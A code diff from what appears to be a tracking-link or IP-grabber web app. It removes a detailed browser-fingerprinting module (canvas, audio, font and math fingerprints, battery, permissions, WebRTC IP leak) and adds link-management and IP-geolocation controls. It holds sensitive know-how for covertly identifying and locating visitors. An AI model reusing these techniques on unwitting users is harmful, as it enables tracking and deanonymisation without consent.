-        renderer:      dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
-        version:       gl.getParameter(gl.VERSION),
-        glslVersion:   gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-        antialias:     gl.getContextAttributes() ? gl.getContextAttributes().antialias : null,
-        extensions:    (gl.getSupportedExtensions() || []).sort(),
-        extensionCount:(gl.getSupportedExtensions() || []).length,
-        params
-      };
-    }catch(e){ return null; }
-  }
-
-  const FONT_CANDIDATES = [
-    "Arial","Arial Black","Arial Narrow","Arial Rounded MT Bold","Arial Unicode MS",
-    "Bahnschrift","Calibri","Cambria","Cambria Math","Candara","Comic Sans MS",
-    "Consolas","Constantia","Corbel","Courier New","DejaVu Sans","DejaVu Sans Mono",
-    "DejaVu Serif","Ebrima","Franklin Gothic Medium","Futura","Gabriola","Gadugi",
-    "Garamond","Georgia","Gill Sans","Helvetica","Helvetica Neue","Impact",
-    "Lucida Console","Lucida Grande","Lucida Sans","Lucida Sans Unicode",
-    "Malgun Gothic","Marlett","Menlo","Microsoft Sans Serif","Monaco",
-    "MS Gothic","MS PGothic","MS Sans Serif","MS Serif","Nirmala UI",
-    "Noto Sans","Noto Serif","Optima","Oxygen","Palatino","Palatino Linotype",
-    "PT Sans","Roboto","Segoe Print","Segoe Script","Segoe UI","Segoe UI Emoji",
-    "Segoe UI Historic","Segoe UI Symbol","SimSun","Sitka","Source Sans Pro",
-    "Sylfaen","Symbol","Tahoma","Times New Roman","Trebuchet MS","Ubuntu",
-    "Verdana","Webdings","Wingdings","Yu Gothic","Cantarell","Fira Sans",
-    "Droid Sans","Droid Sans Mono","Droid Serif","FreeSans","FreeSerif"
-  ];
-
-  function detectFonts(){
-    const base = ["monospace", "sans-serif", "serif"];
-    const probe = "mmmmmmmmmmlliWWWW";
-    const span = document.createElement("span");
-    span.style.cssText =
-      "position:absolute;left:-9999px;top:-9999px;font-size:72px;" +
-      "visibility:hidden;white-space:nowrap;";
-    span.textContent = probe;
-    document.body.appendChild(span);
-    const baseline = {};
-    for(const b of base){
-      span.style.fontFamily = b;
-      baseline[b] = { w: span.offsetWidth, h: span.offsetHeight };
-    }
-    const found = [];
-    for(const f of FONT_CANDIDATES){
-      let hit = false;
-      for(const b of base){
-        span.style.fontFamily = "'" + f + "'," + b;
-        if(span.offsetWidth !== baseline[b].w || span.offsetHeight !== baseline[b].h){
-          hit = true;
-          break;
-        }
-      }
-      if(hit) found.push(f);
-    }
-    span.remove();
-    return found;
-  }
-
-  function textMetrics(){
-    try{
-      const c = document.createElement("canvas");
-      const x = c.getContext("2d");
-      const out = {};
-      const text = "mmmMMMwwwiiilll0123456789";
-      for(const f of ["sans-serif", "serif", "monospace"]){
-        x.font = "16px " + f;
-        out[f] = +(x.measureText(text).width).toFixed(4);
-      }
-      x.font = "16px sans-serif";
-      out.emoji  = +(x.measureText("\u{1F600}\u{1F389}\u{1F680}").width).toFixed(4);
-      out.cjk    = +(x.measureText("\u65E5\u672C\u8A9E\uD55C\uAD6D\uC5B4\u4E2D\u6587").width).toFixed(4);
-      out.rtl    = +(x.measureText("\u0645\u0631\u062D\u0628\u0627").width).toFixed(4);
-      out.astral = +(x.measureText("\u{1D518}\u{1D52B}\u{1D526}").width).toFixed(4);
-      out.combining = +(x.measureText("a\u0301e\u0302i\u0303").width).toFixed(4);
-      return out;
-    }catch(e){ return null; }
-  }
-
-  function mathFingerprint(){
-    const out = {};
-    const probes = [
-      ["tan",    Math.tan(-1e300)],
-      ["sin",    Math.sin(1e300)],
-      ["cos",    Math.cos(1e300)],
-      ["acos",   Math.acos(1.000000000000001)],
-      ["asin",   Math.asin(1.000000000000001)],
-      ["atan",   Math.atan(1e300)],
-      ["atan2",  Math.atan2(1e300, 1e-300)],
-      ["exp",    Math.exp(1e300)],
-      ["log",    Math.log(1e300)],
-      ["log1p",  Math.log1p(1e-300)],
-      ["sqrt",   Math.sqrt(1e300)],
-      ["pow",    Math.pow(1e300, 1e-300)],
-      ["sinh",   Math.sinh(1)],
-      ["tanh",   Math.tanh(1)],
-      ["cbrt",   Math.cbrt(100)],
-      ["hypot",  Math.hypot(1e300, 1e300)]
-    ];
-    for(const [k, v] of probes) out[k] = v;
-    try{ out.numberFormat = new Intl.NumberFormat().format(1234567.891); }catch(e){}
-    try{ out.dateFormat = new Intl.DateTimeFormat().format(new Date(2024, 0, 1)); }catch(e){}
-    try{ out.collator = ["a","b","c"].sort(new Intl.Collator().compare).join(""); }catch(e){}
-    try{ out.pluralRules = new Intl.PluralRules().select(1.5); }catch(e){}
-    try{ out.listFormat = new Intl.ListFormat().format(["a","b","c"]); }catch(e){}
-    try{ out.relativeTime = new Intl.RelativeTimeFormat().format(-1, "day"); }catch(e){}
-    return out;
-  }
-
-  function errorStackShape(){
-    try{
-      const e = new Error("x");
-      const s = (e.stack || "").split("\n");
-      return {
-        firstLine: (s[0] || "").slice(0, 140),
-        lineCount: s.length,
-        hasEval:   /eval/.test(e.stack || "")
-      };
-    }catch(e){ return null; }
-  }
-
-  function timerPrecision(){
-    try{
-      const samples = [];
-      for(let i = 0; i < 6; i++){
-        const t0 = performance.now();
-        let t1 = performance.now(), guard = 0;
-        while(t1 === t0 && guard++ < 1e6) t1 = performance.now();
-        const d = t1 - t0;
-        if(d > 0) samples.push(d);
-      }
-      const min = samples.length ? Math.min(...samples) : null;
-      return {
-        timeOrigin:      performance.timeOrigin ? Math.round(performance.timeOrigin) : null,
-        minDeltaMs:      min !== null ? +min.toFixed(6) : null,
-        reducedPrecision: min !== null && min >= 1
-      };
-    }catch(e){ return null; }
-  }
-
-  const VIDEO_CODECS = [
-    'video/mp4; codecs="avc1.42E01E"',
-    'video/mp4; codecs="avc1.4D401E"',
-    'video/mp4; codecs="hvc1.1.6.L93.B0"',
-    'video/mp4; codecs="av01.0.05M.08"',
-    'video/webm; codecs="vp8"',
-    'video/webm; codecs="vp9"',
-    'video/webm; codecs="av01.0.05M.08"',
-    'video/ogg; codecs="theora"'
-  ];
-  const AUDIO_CODECS = [
-    'audio/mpeg',
-    'audio/ogg; codecs="vorbis"',
-    'audio/ogg; codecs="opus"',
-    'audio/wav; codecs="1"',
-    'audio/mp4; codecs="mp4a.40.2"',
-    'audio/flac',
-    'audio/webm; codecs="opus"',
-    'audio/aac'
-  ];
-
-  function codecSupport(){
-    const v = document.createElement("video");
-    const a = document.createElement("audio");
-    const out = { video:{}, audio:{} };
-    for(const c of VIDEO_CODECS){
-      try{ out.video[c] = v.canPlayType(c) || "no"; }catch(e){ out.video[c] = "err"; }
-    }
-    for(const c of AUDIO_CODECS){
-      try{ out.audio[c] = a.canPlayType(c) || "no"; }catch(e){ out.audio[c] = "err"; }
-    }
-    return out;
-  }
-
-  const MEDIA_QUERIES = [
-    "prefers-color-scheme: dark",
-    "prefers-color-scheme: light",
-    "prefers-reduced-motion: reduce",
-    "prefers-reduced-motion: no-preference",
-    "prefers-reduced-transparency: reduce",
-    "prefers-contrast: more",
-    "prefers-contrast: less",
-    "forced-colors: active",
-    "inverted-colors: inverted",
-    "hover: hover",
-    "hover: none",
-    "any-hover: hover",
-    "pointer: fine",
-    "pointer: coarse",
-    "pointer: none",
-    "any-pointer: fine",
-    "any-pointer: coarse",
-    "display-mode: standalone",
-    "display-mode: fullscreen",
-    "display-mode: minimal-ui",
-    "display-mode: browser",
-    "orientation: portrait",
-    "orientation: landscape",
-    "dynamic-range: high",
-    "color-gamut: p3",
-    "color-gamut: rec2020",
-    "scripting: enabled",
-    "update: fast",
-    "overflow-block: scroll",
-    "overflow-inline: scroll"
-  ];
-
-  function mediaQueryState(){
-    const out = {};
-    for(const q of MEDIA_QUERIES){
-      try{ out[q] = matchMedia("(" + q + ")").matches; }catch(e){ out[q] = null; }
-    }
-    return out;
-  }
-
-  async function highEntropyHints(){
-    const uad = navigator.userAgentData;
-    if(!uad || typeof uad.getHighEntropyValues !== "function") return null;
-    try{
-      const h = await uad.getHighEntropyValues([
-        "architecture","bitness","model","platformVersion","uaFullVersion",
-        "fullVersionList","wow64","formFactors"
-      ]);
-      return {
-        architecture:    h.architecture    ?? null,
-        bitness:         h.bitness         ?? null,
-        model:           h.model           ?? null,
-        platformVersion: h.platformVersion ?? null,
-        uaFullVersion:   h.uaFullVersion   ?? null,
-        wow64:           h.wow64           ?? null,
-        formFactors:     h.formFactors     ?? null,
-        fullVersionList: h.fullVersionList
-          ? h.fullVersionList.map(b => b.brand + " " + b.version)
-          : null
-      };
-    }catch(e){ return null; }
-  }
-
-  function speechVoices(){
-    return new Promise(resolve => {
-      if(!window.speechSynthesis || typeof speechSynthesis.getVoices !== "function")
-        return resolve(null);
-      const collect = () => (speechSynthesis.getVoices() || [])
-        .map(v => v.name + " (" + v.lang + ")");
-      let v = collect();
-      if(v.length) return resolve(v);
-      let done = false;
-      const finish = () => {
-        if(done) return;
-        done = true;
-        resolve(collect());
-      };
-      try{ speechSynthesis.onvoiceschanged = finish; }catch(e){}
-      setTimeout(finish, 1200);
-    });
-  }
-
-  function webrtcLeak(ms){
-    return new Promise(resolve => {
-      const out = { local:[], stun:[] };
-      let pc;
-      try{
-        pc = new RTCPeerConnection({
-          iceServers:[
-            {urls:"stun:stun.l.google.com:19302"},
-            {urls:"stun:stun.cloudflare.com:3478"}
-          ]
-        });
-      }catch(e){ return resolve(out); }
-      let done = false;
-      const finish = () => {
-        if(done) return;
-        done = true;
-        try{ pc.close(); }catch(e){}
-        resolve(out);
-      };
-      const timer = setTimeout(finish, ms);
-      pc.onicecandidate = e => {
-        if(!e.candidate){ clearTimeout(timer); return finish(); }
-        const ip = e.candidate.candidate.split(" ")[4];
-        if(!ip || /\.local$/i.test(ip)) return;
-        const priv = /^(10\.|127\.|192\.168\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|fe80|fc|fd|::1)/i.test(ip);
-        (priv ? out.local : out.stun).push(ip);
-      };
-      try{
-        pc.createDataChannel("probe");
-        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-      }catch(e){ clearTimeout(timer); finish(); }
-    });
-  }
-
-  async function storageInfo(){
-    try{
-      if(!navigator.storage) return null;
-      const out = {};
-      if(navigator.storage.estimate){
-        const e = await navigator.storage.estimate();
-        out.quotaMB = e.quota ? Math.round(e.quota / 1048576) : null;
-        out.usageMB = e.usage != null ? +(e.usage / 1048576).toFixed(2) : null;
-      }
-      if(navigator.storage.persisted){
-        try{ out.persisted = await navigator.storage.persisted(); }catch(e){}
-      }
-      return out;
-    }catch(e){ return null; }
-  }
-
-  async function permissionStates(){
-    const names = [
-      "geolocation","notifications","camera","microphone",
-      "clipboard-read","clipboard-write","midi",
-      "background-sync","persistent-storage","accelerometer","gyroscope"
-    ];
-    const out = {};
-    if(!navigator.permissions || !navigator.permissions.query) return out;
-    await Promise.all(names.map(async n => {
-      try{
-        const s = await navigator.permissions.query({name:n});
-        out[n] = s.state;
-      }catch(e){}
-    }));
-    return out;
-  }
-
-  async function mediaCounts(){
-    try{
-      if(!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
-      const d = await navigator.mediaDevices.enumerateDevices();
-      return {
-        audioIn:  d.filter(x => x.kind === "audioinput").length,
-        audioOut: d.filter(x => x.kind === "audiooutput").length,
-        videoIn:  d.filter(x => x.kind === "videoinput").length,
-        labelsHidden: d.every(x => !x.label)
-      };
-    }catch(e){ return null; }
-  }
-
-  function batteryInfo(){
-    if(!navigator.getBattery) return Promise.resolve(null);
-    return navigator.getBattery().then(b => ({
-      level: Math.round(b.level * 100) + "%",
-      charging: b.charging,
-      dischargeMinutes: b.dischargingTime === Infinity
-        ? null : Math.round(b.dischargingTime / 60)
-    })).catch(() => null);
-  }
-
-  function featureFlags(){
-    const tryIt = fn => { try{ return fn(); }catch(e){ return false; } };
-    return {
-      cookiesEnabled:    navigator.cookieEnabled,
-      localStorage:      tryIt(() => { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); return true; }),
-      sessionStorage:    tryIt(() => { sessionStorage.setItem("_t","1"); sessionStorage.removeItem("_t"); return true; }),
-      indexedDB:         !!window.indexedDB,
-      serviceWorker:     "serviceWorker" in navigator,
-      webAssembly:       typeof WebAssembly === "object",
-      webgl:             tryIt(() => !!document.createElement("canvas").getContext("webgl")),
-      webgl2:            tryIt(() => !!document.createElement("canvas").getContext("webgl2")),
-      webgpu:            "gpu" in navigator,
-      sharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
-      crossOriginIsolated: !!window.crossOriginIsolated,
-      originAgentCluster:  !!window.originAgentCluster,
-      webdriver:         navigator.webdriver === true,
-      pdfViewer:         navigator.pdfViewerEnabled ?? null,
-      doNotTrack:        navigator.doNotTrack || window.doNotTrack || "unspecified",
-      plugins:           (() => { try{ return Array.from(navigator.plugins || []).map(p => p.name); }catch(e){ return []; } })(),
-      mimeTypes:         (() => { try{ return Array.from(navigator.mimeTypes || []).map(m => m.type); }catch(e){ return []; } })()
-    };
-  }
-
-  async function scan(){
-    const n = navigator, s = screen;
-    const conn = n.connection || n.mozConnection || n.webkitConnection || {};
-    let tz = null, locale = null;
-    try{
-      const dtf = Intl.DateTimeFormat().resolvedOptions();
-      tz = dtf.timeZone;
-      locale = dtf.locale;
-    }catch(e){}
-
-    const [
-      rt, storage, perms, media, battery, hints, voices, audio
-    ] = await Promise.all([
-      webrtcLeak(2000),
-      storageInfo(),
-      permissionStates(),
-      mediaCounts(),
-      batteryInfo(),
-      highEntropyHints(),
-      speechVoices(),
-      audioFingerprint()
-    ]);
-
-    const gl = webglInfo();
-
-    return {
-      browser: {
-        name:       browserName(n.userAgent),
-        userAgent:  n.userAgent,
-        vendor:     n.vendor || null,
-        appVersion: n.appVersion || null,
-        os:         osName(n.userAgent),
-        platform:   n.platform || null,
-        product:    n.product || null,
-        productSub: n.productSub || null,
-        uaData:     n.userAgentData ? {
-          brands:   n.userAgentData.brands,
-          mobile:   n.userAgentData.mobile,
-          platform: n.userAgentData.platform
-        } : null,
-        highEntropy: hints
-      },
-      display: {
-        screen:           s.width + "\u00d7" + s.height,
-        availScreen:      s.availWidth + "\u00d7" + s.availHeight,
-        viewport:         innerWidth + "\u00d7" + innerHeight,
-        outerWindow:      outerWidth + "\u00d7" + outerHeight,
-        devicePixelRatio: devicePixelRatio || 1,
-        colorDepth:       s.colorDepth,
-        pixelDepth:       s.pixelDepth,
-        orientationType:  (s.orientation && s.orientation.type) || null,
-        orientationAngle: (s.orientation && s.orientation.angle) ?? null
-      },
-      hardware: {
-        cpuCores:       n.hardwareConcurrency || null,
-        deviceMemoryGB: n.deviceMemory || null,
-        maxTouchPoints: n.maxTouchPoints || 0,
-        battery
-      },
-      locale: {
-        language:     n.language || null,
-        languages:    n.languages || [],
-        timezone:     tz,
-        locale:       locale,
-        utcOffsetMin: new Date().getTimezoneOffset(),
-        dateString:   new Date().toString()
-      },
-      network: {
-        effectiveType: conn.effectiveType || null,
-        downlinkMbps:  conn.downlink ?? null,
-        rttMs:         conn.rtt ?? null,
-        saveData:      conn.saveData ?? null,
-        online:        n.onLine,
-        webrtcLocal:   [...new Set(rt.local)],
-        webrtcStun:    [...new Set(rt.stun)]
-      },
-      storage,
-      permissions:  perms,
-      mediaDevices: media,
-      capabilities: featureFlags(),
-      codecs:       codecSupport(),
-      mediaQueries: mediaQueryState(),
-      fonts:        detectFonts(),
-      webgl:        gl,
-      speechVoices: voices,
-      fingerprint: {
-        canvas:      canvasHash(),
-        audio:       audio,
-        textMetrics: textMetrics(),
-        math:        mathFingerprint(),
-        errorStack:  errorStackShape(),
-        timer:       timerPrecision()
-      },
-      page: {
-        url:           location.href,
-        origin:        location.origin,
-        referrer:      document.referrer || null,
-        title:         document.title,
-        historyLength: history.length,
-        visibility:    document.visibilityState,
-        charset:       document.characterSet,
-        contentType:   document.contentType
-      }
-    };
-  }
-
-  function esc(v){
-    if(v === null || v === undefined) return '<span class="v none">not available</span>';
-    if(Array.isArray(v)) return v.length ? esc(v.join(", ")) : '<span class="v none">none</span>';
-    if(typeof v === "object") return esc(JSON.stringify(v));
-    if(v === true)  return '<span class="v ok">yes</span>';
-    if(v === false) return '<span class="v bad">no</span>';
-    return String(v)
-      .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
-  }
-
-  function section(title, rows){
-    const body = rows
-      .filter(Boolean)
-      .map(([k, v]) => `<div class="row"><div class="k">${k}</div><div class="v">${esc(v)}</div></div>`)
-      .join("");
-    return `<section><h2>${title}</h2>${body}</section>`;
-  }
-
-  function render(d){
-    const p  = d.permissions || {};
-    const md = d.mediaDevices;
-    const cap = d.capabilities;
-
-    const codecRows = [
-      ...Object.entries(d.codecs.video).map(([k, v]) => ["v " + k, v]),
-      ...Object.entries(d.codecs.audio).map(([k, v]) => ["a " + k, v])
-    ];
-    const mqRows = Object.entries(d.mediaQueries).map(([k, v]) => [k, v]);
-    const mathRows = Object.entries(d.fingerprint.math).map(([k, v]) =>
-      [k, typeof v === "number" ? v.toPrecision(17) : v]);
-    const textRows = Object.entries(d.fingerprint.textMetrics || {}).map(([k, v]) => [k, v]);
-    const glParams = d.webgl ? Object.entries(d.webgl.params)
-      .map(([k, v]) => [k, Array.isArray(v) ? v.join(", ") : v]) : [];
-
-    I("iout").innerHTML = [
-      section("browser", [
-        ["name",        d.browser.name],
-        ["os",          d.browser.os],
-        ["platform",    d.browser.platform],
-        ["vendor",      d.browser.vendor],
-        ["product",     d.browser.product],
-        ["user agent",  d.browser.userAgent],
-        ["ua brands",   d.browser.uaData ? d.browser.uaData.brands.map(b => b.brand + " " + b.version) : null],
-        ["mobile",      d.browser.uaData ? d.browser.uaData.mobile : null],
-        ["architecture", d.browser.highEntropy ? d.browser.highEntropy.architecture : null],
-        ["bitness",      d.browser.highEntropy ? d.browser.highEntropy.bitness : null],
-        ["model",        d.browser.highEntropy ? d.browser.highEntropy.model : null],
-        ["platform ver", d.browser.highEntropy ? d.browser.highEntropy.platformVersion : null],
-        ["ua full ver",  d.browser.highEntropy ? d.browser.highEntropy.uaFullVersion : null],
-        ["wow64",        d.browser.highEntropy ? d.browser.highEntropy.wow64 : null],
-        ["form factors", d.browser.highEntropy ? d.browser.highEntropy.formFactors : null],
-        ["full versions", d.browser.highEntropy ? d.browser.highEntropy.fullVersionList : null]
-      ]),
-      section("display", [
-        ["screen",           d.display.screen],
-        ["available",        d.display.availScreen],
-        ["viewport",         d.display.viewport],
-        ["outer window",     d.display.outerWindow],
-        ["pixel ratio",      d.display.devicePixelRatio],
-        ["color depth",      d.display.colorDepth + "-bit"],
-        ["pixel depth",      d.display.pixelDepth + "-bit"],
-        ["orientation",      d.display.orientationType],
-        ["orientation angle", d.display.orientationAngle]
-      ]),
-      section("hardware", [
-        ["cpu cores",     d.hardware.cpuCores],
-        ["device memory", d.hardware.deviceMemoryGB ? d.hardware.deviceMemoryGB + " GB" : null],
-        ["touch points",  d.hardware.maxTouchPoints],
-        ["gpu vendor",    d.webgl ? d.webgl.vendor : null],
-        ["gpu renderer",  d.webgl ? d.webgl.renderer : null],
-        ["battery",       d.hardware.battery
-          ? d.hardware.battery.level + " · " + (d.hardware.battery.charging ? "charging" : "discharging")
-          : null]
-      ]),
-      section("locale &amp; time", [
-        ["language",   d.locale.language],
-        ["languages",  d.locale.languages],
-        ["locale",     d.locale.locale],
-        ["timezone",   d.locale.timezone],
-        ["utc offset", (-d.locale.utcOffsetMin / 60) + "h"],
-        ["local time", d.locale.dateString]
-      ]),
-      section("network", [
-        ["online",           d.network.online],
-        ["effective type",   d.network.effectiveType],
-        ["downlink",         d.network.downlinkMbps != null ? d.network.downlinkMbps + " Mb/s" : null],
-        ["rtt",              d.network.rttMs != null ? d.network.rttMs + " ms" : null],
-        ["save data",        d.network.saveData],
-        ["webrtc local IPs", d.network.webrtcLocal],
-        ["webrtc STUN IPs",  d.network.webrtcStun]
-      ]),
-      section("storage", [
-        ["localStorage",   cap.localStorage],
-        ["sessionStorage", cap.sessionStorage],
-        ["indexedDB",      cap.indexedDB],
-        ["service worker", cap.serviceWorker],
-        ["quota",          d.storage && d.storage.quotaMB ? d.storage.quotaMB + " MB" : null],
-        ["in use",         d.storage && d.storage.usageMB != null ? d.storage.usageMB + " MB" : null],
-        ["persisted",      d.storage ? d.storage.persisted : null]
-      ]),
-      section("permissions", Object.keys(p).length
-        ? Object.entries(p).map(([k, v]) => [k, v])
-        : [["status", "permissions API unavailable"]]),
-      section("media devices", md ? [
-        ["cameras",     md.videoIn],
-        ["microphones", md.audioIn],
-        ["speakers",    md.audioOut],
-        ["labels",      md.labelsHidden ? "hidden until permission granted" : "visible"]
-      ] : [["status", "enumerateDevices unavailable"]]),
-      section("capabilities", [
-        ["cookies enabled",   cap.cookiesEnabled],
-        ["webgl",             cap.webgl],
-        ["webgl2",            cap.webgl2],
-        ["webgpu",            cap.webgpu],
-        ["webassembly",       cap.webAssembly],
-        ["sharedArrayBuffer", cap.sharedArrayBuffer],
-        ["crossOriginIsolated", cap.crossOriginIsolated],
-        ["originAgentCluster",  cap.originAgentCluster],
-        ["webdriver",         cap.webdriver],
-        ["pdf viewer",        cap.pdfViewer],
-        ["do not track",      cap.doNotTrack],
-        ["plugins",           cap.plugins],
-        ["mime types",        cap.mimeTypes]
-      ]),
-      section("fonts installed (" + d.fonts.length + ")", [
-        ["detected", d.fonts.length ? d.fonts : null]
-      ]),
-      section("webgl", d.webgl ? [
-        ["vendor",      d.webgl.vendor],
-        ["renderer",    d.webgl.renderer],
-        ["version",     d.webgl.version],
-        ["glsl",        d.webgl.glslVersion],
-        ["antialias",   d.webgl.antialias],
-        ["extensions",  d.webgl.extensionCount + " — " + d.webgl.extensions.join(", ")],
-        ...glParams
-      ] : [["status", "no WebGL context"]]),
-      section("codecs", codecRows),
-      section("css media queries", mqRows),
-      section("speech voices (" + (d.speechVoices ? d.speechVoices.length : 0) + ")", [
-        ["voices", d.speechVoices && d.speechVoices.length ? d.speechVoices : null]
-      ]),
-      section("fingerprint — canvas / audio", [
-        ["canvas hash",  d.fingerprint.canvas],
-        ["audio hash",   d.fingerprint.audio ? d.fingerprint.audio.hash : null],
-        ["audio sample", d.fingerprint.audio ? d.fingerprint.audio.sample : null]
-      ]),
-      section("fingerprint — text metrics", textRows),
-      section("fingerprint — math / Intl", mathRows),
-      section("fingerprint — engine quirks", [
-        ["stack first line", d.fingerprint.errorStack ? d.fingerprint.errorStack.firstLine : null],
-        ["stack line count", d.fingerprint.errorStack ? d.fingerprint.errorStack.lineCount : null],
-        ["time origin",      d.fingerprint.timer ? d.fingerprint.timer.timeOrigin : null],
-        ["timer resolution", d.fingerprint.timer ? d.fingerprint.timer.minDeltaMs + " ms" : null],
-        ["timer coarsened",  d.fingerprint.timer ? d.fingerprint.timer.reducedPrecision : null]
-      ]),
-      section("page", [
-        ["url",            d.page.url],
-        ["origin",         d.page.origin],
-        ["referrer",       d.page.referrer],
-        ["title",          d.page.title],
-        ["charset",        d.page.charset],
-        ["content type",   d.page.contentType],
-        ["history length", d.page.historyLength + " (count only — contents are not readable)"],
-        ["visibility",     d.page.visibility]
-      ])
-    ].join("");
-
-    I("json").textContent = JSON.stringify(d, null, 2);
-  }
-
-  let LAST = null;
-
-  async function runInfo(){
-    I("json").textContent = "scanning…";
-    I("iout").innerHTML = "";
-    try{
-      LAST = await scan();
-      render(LAST);
-    }catch(e){
-      I("json").textContent = "scan failed: " + (e && e.message ? e.message : e);
-    }
-  }
-
-  function initInfo(){
-    I("copy").addEventListener("click", async () => {
-      if(!LAST) return;
-      try{
-        await navigator.clipboard.writeText(JSON.stringify(LAST, null, 2));
-        I("copy").textContent = "copied";
-      }catch(e){
-        I("copy").textContent = "copy blocked";
-      }
-      setTimeout(() => { I("copy").textContent = "copy JSON"; }, 1400);
-    });
-
-    I("dl").addEventListener("click", () => {
-      if(!LAST) return;
-      const blob = new Blob([JSON.stringify(LAST, null, 2)], {type:"application/json"});
-      const a = document.createElement("a");
-      a.href = URL.createObjectURL(blob);
-      a.download = "browser-info.json";
-      a.click();
-      setTimeout(() => URL.revokeObjectURL(a.href), 1000);
-    });
-
-    I("re").addEventListener("click", runInfo);
-
-    I("back").addEventListener("click", () => {
-      I("info").classList.remove("show");
-      location.hash = "";
-      location.reload();
-    });
-  }
-
-  function boot(){
-    if(location.hash === "#info" || location.hash === "#/info"){
-      $("ui").classList.add("hidden");
-      I("info").classList.add("show");
-      initInfo();
-      runInfo();
-      return;
-    }
-
-    const id = pickId();
-    if(id) grabber(id);
-    else   generator();
-  }
-
-  window.addEventListener("hashchange", () => location.reload());
-  boot();
+  $("clearLinks").addEventListener("click", ()=>{
+    if(!confirm("Clear all links?")) return;
+    Store.clearLinks(); renderLinks(); renderOverview();
+    $("linkPreview").classList.remove("show");
+    toast("Links cleared");
+  });
+  $("resolveBtn").addEventListener("click", doResolve);
+  $("resolveIp").addEventListener("keydown", e=>{ if(e.key==="Enter") doResolve(); });
+  $("globeFocus").addEventListener("click", ()=>{
+    const c = window.__resolverConsensus;
+    if(!c || c.lat == null){ toast("Nothing to focus","err"); return; }
+    focusOnLatLon(c.lat, c.lon);
+  });
+  initSettings();
+  setPage("overview");
+  renderLinks();
+}
+let lastHash = location.hash;
+window.addEventListener("hashchange", ()=>{
+  const hadId = /^#\/?[a-z0-9]{4}/i.test(lastHash);
+  const hasId = /^#\/?[a-z0-9]{4}/i.test(location.hash);
+  if(hadId !== hasId) location.reload();
+  lastHash = location.hash;
+});
+boot();
 })();
 </script>
 </body>
